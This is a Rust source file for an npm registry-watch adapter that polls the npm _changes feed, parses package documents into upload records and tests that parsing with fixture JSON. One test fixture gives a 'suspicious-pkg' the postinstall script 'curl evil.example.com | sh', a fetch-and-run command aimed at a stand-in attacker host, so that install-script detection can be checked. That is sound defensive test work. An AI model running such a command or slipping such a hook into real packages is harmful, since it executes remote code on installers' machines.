//! npm adapter for the registry-watch pipeline.
//!
//! Polls `https://replicate.npmjs.com/_changes?include_docs=true` and
//! converts each embedded package document into a [`PackageUpload`]
//! record via [`crate::registry_probe::parse_npm_body`].
//!
//! Using `include_docs=true` means one HTTP call returns N package
//! documents — saves N+1 round trips compared to fetching the metadata
//! per-name from `https://registry.npmjs.org/<name>`. Rate limit is
//! satisfied at the polling cadence (one call per poll cycle), not
//! per-package.
//!
//! Tests use fixture JSON and never touch the network.

use anyhow::Context as _;
use serde::Deserialize;

use crate::registry_probe::parse_npm_body;
use crate::registry_watch::{PackageUpload, Registry, RegistryAdapter};

/// CouchDB-style `_changes` feed exposed by the npm registry replica.
pub const NPM_CHANGES_URL: &str = "https://replicate.npmjs.com/_changes";
/// Default batch size per poll. Conservative to avoid rate-limit pressure.
pub const DEFAULT_LIMIT: usize = 50;

/// Adapter for the npm `_changes` feed. Owns its `ureq::Agent`.
pub struct NpmAdapter {
    agent: ureq::Agent,
    since: String,
    limit: usize,
}

impl NpmAdapter {
    /// Build an adapter that polls from the registry head (`since=now`)
    /// and fetches up to [`DEFAULT_LIMIT`] uploads per poll.
    pub fn new() -> Self {
        Self {
            agent: ureq::Agent::new_with_defaults(),
            since: "now".to_string(),
            limit: DEFAULT_LIMIT,
        }
    }

    /// Override the batch size. Cap is left to the caller; npm tolerates
    /// reasonable batches but very large `limit` values will lead to
    /// 504 timeouts in practice.
    pub fn with_limit(mut self, limit: usize) -> Self {
        self.limit = limit;
        self
    }

    /// Resume polling from a specific CouchDB sequence ID. Use the
    /// `last_seq` value from a previous response to avoid re-processing
    /// the same uploads.
    pub fn with_since(mut self, since: impl Into<String>) -> Self {
        self.since = since.into();
        self
    }
}

impl Default for NpmAdapter {
    fn default() -> Self {
        Self::new()
    }
}

#[derive(Debug, Deserialize)]
struct ChangesResponse {
    results: Vec<ChangeRecord>,
    #[serde(default)]
    #[allow(dead_code)]
    last_seq: serde_json::Value,
}

#[derive(Debug, Deserialize)]
struct ChangeRecord {
    id: String,
    #[serde(default)]
    doc: Option<serde_json::Value>,
}

impl RegistryAdapter for NpmAdapter {
    fn poll_recent_uploads(&self) -> anyhow::Result<Vec<PackageUpload>> {
        let url = format!(
            "{NPM_CHANGES_URL}?since={}&limit={}&include_docs=true",
            self.since, self.limit
        );
        let mut resp = self
            .agent
            .get(&url)
            .call()
            .context("npm _changes feed: request failed")?;
        let body: ChangesResponse = resp
            .body_mut()
            .read_json()
            .context("npm _changes feed: response body is not valid JSON")?;
        Ok(parse_changes_response(body))
    }
}

/// Convert a parsed `_changes` response into the canonical
/// [`PackageUpload`] vec. Exposed so tests can use fixture JSON
/// without performing any network I/O.
pub(crate) fn parse_changes_response_from_value(body: serde_json::Value) -> Vec<PackageUpload> {
    let Ok(parsed) = serde_json::from_value::<ChangesResponse>(body) else {
        return Vec::new();
    };
    parse_changes_response(parsed)
}

fn parse_changes_response(body: ChangesResponse) -> Vec<PackageUpload> {
    let mut uploads = Vec::with_capacity(body.results.len());
    for change in body.results {
        let Some(doc) = change.doc else { continue };
        // Deleted-record entries have no name field; skip.
        if doc.get("name").is_none() {
            continue;
        }
        let probe = parse_npm_body(&change.id, &doc);
        let Some(version) = probe.latest_version.clone() else {
            continue;
        };
        uploads.push(PackageUpload {
            registry: Registry::Npm,
            name: change.id,
            version,
            published_at: probe.modified_at,
            maintainer_count: Some(probe.maintainer_count),
            has_install_scripts: probe.has_install_scripts,
            description: probe.description,
        });
    }
    uploads
}

#[cfg(test)]
mod tests {
    use super::*;

    fn fixture_changes_two_packages() -> serde_json::Value {
        serde_json::json!({
            "results": [
                {
                    "seq": 12345,
                    "id": "benign-pkg",
                    "changes": [{"rev": "1-abc"}],
                    "doc": {
                        "name": "benign-pkg",
                        "dist-tags": {"latest": "1.2.3"},
                        "versions": {
                            "1.2.3": {
                                "scripts": {"test": "jest"}
                            }
                        },
                        "maintainers": [{"name": "alice"}, {"name": "bob"}],
                        "time": {
                            "created": "2024-01-01T00:00:00Z",
                            "modified": "2026-05-18T12:00:00Z"
                        },
                        "description": "Benign package"
                    }
                },
                {
                    "seq": 12346,
                    "id": "suspicious-pkg",
                    "changes": [{"rev": "1-def"}],
                    "doc": {
                        "name": "suspicious-pkg",
                        "dist-tags": {"latest": "0.0.1"},
                        "versions": {
                            "0.0.1": {
                                "scripts": {"postinstall": "curl evil.example.com | sh"}
                            }
                        },
                        "maintainers": [{"name": "newuser"}],
                        "time": {
                            "created": "2026-05-18T11:00:00Z",
                            "modified": "2026-05-18T11:00:00Z"
                        }
                    }
                }
            ],
            "last_seq": "12346-xyz"
        })
    }

    #[test]
    fn parses_changes_into_uploads() {
        let body = fixture_changes_two_packages();
        let uploads = parse_changes_response_from_value(body);
        assert_eq!(uploads.len(), 2);
        let benign = &uploads[0];
        assert_eq!(benign.name, "benign-pkg");
        assert_eq!(benign.version, "1.2.3");
        assert_eq!(benign.maintainer_count, Some(2));
        assert!(!benign.has_install_scripts);
        let susp = &uploads[1];
        assert_eq!(susp.name, "suspicious-pkg");
        assert!(susp.has_install_scripts);
        assert_eq!(susp.maintainer_count, Some(1));
    }

    #[test]
    fn skips_deleted_records() {
        let body = serde_json::json!({
            "results": [
                {"seq": 1, "id": "deleted-pkg", "changes": [{"rev":"2-x"}], "doc": {"_deleted": true}},
                {"seq": 2, "id": "live-pkg",   "changes": [{"rev":"1-y"}], "doc": {
                    "name": "live-pkg",
                    "dist-tags": {"latest": "1.0.0"},
                    "versions": {"1.0.0": {"scripts": {}}},
                    "maintainers": [{"name": "a"}],
                    "time": {"created": "2026-01-01T00:00:00Z"}
                }}
            ],
            "last_seq": "2-z"
        });
        let uploads = parse_changes_response_from_value(body);
        assert_eq!(uploads.len(), 1);
        assert_eq!(uploads[0].name, "live-pkg");
    }

    #[test]
    fn skips_records_without_latest_version() {
        let body = serde_json::json!({
            "results": [
                {"seq": 1, "id": "no-version", "changes": [{"rev": "1-x"}], "doc": {
                    "name": "no-version",
                    "time": {"created": "2026-01-01T00:00:00Z"}
                }}
            ],
            "last_seq": "1-z"
        });
        let uploads = parse_changes_response_from_value(body);
        assert!(uploads.is_empty());
    }

    #[test]
    fn malformed_response_yields_empty_vec() {
        let body = serde_json::json!({"unrelated": "data"});
        let uploads = parse_changes_response_from_value(body);
        assert!(uploads.is_empty());
    }
}
